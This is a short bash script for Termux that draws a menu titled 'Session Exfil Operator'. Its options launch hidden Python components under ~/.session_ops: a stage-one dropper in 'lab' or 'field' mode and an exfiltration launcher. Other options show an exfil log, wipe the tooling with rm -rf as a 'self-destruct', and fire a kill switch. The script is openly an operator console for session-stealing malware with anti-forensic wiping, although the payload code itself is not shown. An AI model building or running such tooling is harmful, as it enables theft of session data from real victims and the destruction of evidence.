
#!/data/data/com.termux/files/usr/bin/bash

while true; do
    clear
    echo "┌──────────────────────────────┐"
    echo "│  Session Exfil Operator 🦅   │"
    echo "└──────────────────────────────┘"
    echo "[1] Deploy Payload (Lab Mode)"
    echo "[2] Deploy Payload (Field Mode)"
    echo "[3] Trigger Manual Exfil"
    echo "[4] View Logs"
    echo "[5] Wipe / Self-Destruct"
    echo "[6] Kill-Switch Trigger"
    echo "[0] Exit"
    echo -n "Select > "
    read opt
    case $opt in
        1) python3 ~/.session_ops/.core/stage_1_dropper.py --lab --consent ;;
        2) python3 ~/.session_ops/.core/stage_1_dropper.py --field --consent ;;
        3) python3 ~/.session_ops/.core/exfil_launcher.py --field --consent ;;
        4) cat ~/.session_ops/.core/.logs/exfil.log ;;
        5) rm -rf ~/.session_ops && echo "[*] Wiped." ;;
        6) export KILL=1 && python3 ~/.session_ops/.core/stage_1_dropper.py --kill ;;
        0) break ;;
    esac
    read -p "Press enter to return to menu..."
done
